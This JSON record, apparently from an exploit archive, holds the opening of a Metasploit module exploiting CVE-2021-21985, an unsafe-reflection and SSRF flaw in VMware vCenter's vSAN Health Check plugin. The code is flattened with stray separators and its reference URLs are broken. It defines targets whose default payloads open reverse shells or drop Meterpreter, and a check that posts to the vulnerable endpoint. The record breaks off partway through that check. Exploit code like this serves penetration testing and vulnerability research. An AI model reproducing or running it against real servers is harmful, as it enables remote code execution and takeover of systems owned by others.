{
    "text": "vul_name : VMware vCenter Server Virtual SAN Health Check Remote Code Execution ， vul_cve : CVE-2021-21985 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， prepend Msf : Exploit : Remote : AutoCheck ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : CmdStager ， super (  ， update_info (  ， info ,  ， 'Name' => 'VMware vCenter Server Virtual SAN Health Check Plugin RCE' ,  ， 'Description' => %q{ ， This module exploits Java unsafe reflection and SSRF in the VMware ， vCenter Server Virtual SAN Health Check plugin's ProxygenController ， class to execute code as the vsphere-ui user. ， See the vendor advisory for affected and patched versions. Tested ， against VMware vCenter Server 6.7 Update 3m ( Linux appliance ) . ， } ,  ， 'Author' => [  ， 'Ricter Z' ,  # Discovery and PoC used ， 'wvu' # Analysis and exploit ，  ]  ,  ， ' ，  [ 'CVE' , '2021-21985' ]  ,  ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  # Other great writeups !  ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  ]  ,  ， 'DisclosureDate' => '2021-05-25' ,  ， 'License' => MSF_LICENSE ,  ， 'Platform' => [ 'unix' , 'linux' ]  ,  # TODO : Windows? ， 'Arch' => [ ARCH_CMD , ARCH_X86 , ARCH_X64 ]  ,  ， 'Privileged' => false ,  ， 'Targets' => [  ，  [  ， 'Unix Command' ,  ， { ， 'Platform' => 'unix' ,  ， 'Arch' => ARCH_CMD ,  ， 'Type' => : unix_cmd ,  ， 'DefaultOptions' => { ， 'PAYLOAD' => 'cmd/unix/reverse_python_ssl' ， } ， } ，  ]  ,  ，  [  ， 'Linux Dropper' ,  ， { ， 'Platform' => 'linux' ,  ， 'Arch' => [ ARCH_X86 , ARCH_X64 ]  ,  ， 'Type' => : linux_dropper ,  ， 'DefaultOptions' => { ， 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp' ， } ， } ，  ]  ，  ]  ,  ， 'DefaultTarget' => 0 ,  ， 'DefaultOptions' => { ， 'RPORT' => 443 ,  ， 'SSL' => true ， } ,  ， 'Notes' => { ， 'Stability' => [ CRASH_SAFE ]  ,  ， 'Reliability' => [ FIRST_ATTEMPT_FAIL ]  ,  # SSRF can be a little finicky ， 'SideEffects' => [  ， IOC_IN_LOGS ,  # /var/log/vmware/vsphere-ui/logs/vsphere_client_virgo.log ， ARTIFACTS_ON_DISK # CmdStager ，  ]  ， } ， register_options (  [  ， OptString.new ( 'TARGETURI' ,  [ true , 'Base path' , '/' ]  )  ，  ]  )  ， end ， def check ， res = send_request_cgi (  ， 'method' => 'POST' ,  ， 'uri' => normalize_uri (  ， target_uri.path ,  ， '/ui/h5-vsan/rest/proxy/service/systemProperties/getProperty' ， 'ctype' => 'application/json' ,  ， 'data' => { ， 'methodInput' => [ 'user.name' , nil ]  ， }.to_json",
    "time": "2021.07.15"
}